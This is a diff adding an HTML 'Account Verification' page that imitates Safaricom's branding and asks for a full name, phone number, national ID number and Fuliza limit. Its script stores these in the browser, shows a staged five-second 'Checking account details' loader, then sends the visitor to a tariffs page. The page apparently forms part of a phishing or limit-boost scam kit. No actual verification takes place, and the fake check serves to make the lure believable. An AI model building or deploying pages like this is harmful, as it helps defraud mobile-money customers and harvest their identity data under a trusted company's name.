@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Account Verification</title>
+
+<style>
+
+body{
+  font-family:Arial, sans-serif;
+  background:#f4f4f4;
+  margin:0;
+}
+
+/* TOP BAR */
+
+.top-bar{
+  background:#1fb141;
+  padding:12px;
+  text-align:center;
+}
+
+.logo{
+  color:white;
+  font-weight:bold;
+  font-size:20px;
+}
+
+/* CONTAINER */
+
+.container{
+  max-width:420px;
+  margin:50px auto;
+  background:white;
+  padding:30px;
+  border-radius:12px;
+  box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+h3{
+  text-align:center;
+  margin-bottom:20px;
+  color:#222;
+}
+
+/* INPUTS */
+
+label{
+  font-size:13px;
+  color:#555;
+}
+
+input{
+  width:100%;
+  padding:12px;
+  margin-top:6px;
+  margin-bottom:15px;
+  border:1px solid #ddd;
+  border-radius:6px;
+  font-size:15px;
+}
+
+/* BUTTON */
+
+button{
+  width:100%;
+  padding:14px;
+  background:#1fb141;
+  color:white;
+  border:none;
+  border-radius:30px;
+  font-size:16px;
+  cursor:pointer;
+  margin-top:10px;
+}
+
+button:hover{
+  background:#169c37;
+}
+
+/* ERROR */
+
+.error{
+  color:red;
+  text-align:center;
+  margin-top:10px;
+  font-size:14px;
+}
+
+/* LOADER */
+
+.loader{
+  display:none;
+  text-align:center;
+  margin-top:20px;
+}
+
+.spinner{
+  width:50px;
+  height:50px;
+  border:5px solid #eee;
+  border-top:5px solid #1fb141;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:auto;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0)}
+  100%{transform:rotate(360deg)}
+}
+
+</style>
+
+</head>
+
+<body>
+  <header class="top-bar">
+    <div class="logo">Safaricom</div>
+  </header>
+
+  <div class="container">
+
+    <h3>Verify Your Account</h3>
+
+    <label>Full Name</label>
+    <input type="text" id="name" placeholder="Enter your full name">
+
+    <label>Safaricom Phone Number</label>
+    <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX">
+
+    <label>National ID Number</label>
+    <input type="number" id="idnum" placeholder="Enter ID number">
+
+    <label>Your Current Fuliza Limit</label>
+    <input type="number" id="limit" placeholder="Ksh">
+
+    <button onclick="verifyUser()">Verify Account</button>
+
+    <div class="error" id="error"></div>
+
+    <div class="loader" id="loader">
+      <div class="spinner"></div>
+      <p>Checking account details...</p>
+    </div>
+
+  </div>
+
+<script>
+function verifyUser(){
+  let name = document.getElementById("name").value.trim()
+  let phone = document.getElementById("phone").value.trim()
+  let id = document.getElementById("idnum").value.trim()
+  let limit = document.getElementById("limit").value.trim()
+  let error = document.getElementById("error")
+  error.innerText = ""
+
+  /* NAME */
+  if(name.length < 3){
+    error.innerText="Please enter your full name"
+    return
+  }
+
+  /* PHONE */
+  if(!phone.startsWith("07") && !phone.startsWith("01")){
+    error.innerText="Enter a valid Safaricom number starting with 07 or 01"
+    return
+  }
+  if(phone.length !== 10){
+    error.innerText="Phone number must contain 10 digits"
+    return
+  }
+
+  /* ID */
+  if(id.length < 7 || id.length > 9){
+    error.innerText="ID number must be 7 or 9 digits"
+    return
+  }
+
+  /* LIMIT - Allow 0 */
+  if(limit === "" || Number(limit) < 0){
+    error.innerText="Enter your current Fuliza limit (can be 0)"
+    return
+  }
+
+  /* SAVE DATA */
+  localStorage.setItem("userName", name)
+  localStorage.setItem("userPhone", phone)
+  localStorage.setItem("userID", id)
+  localStorage.setItem("currentLimit", limit)
+
+  /* SHOW LOADER */
+  document.getElementById("loader").style.display="block"
+
+  /* WAIT 5 SECONDS */
+  setTimeout(()=>{ window.location.href="tariffs.html" },5000)
+}
+</script>
+
+</body>
+</html>
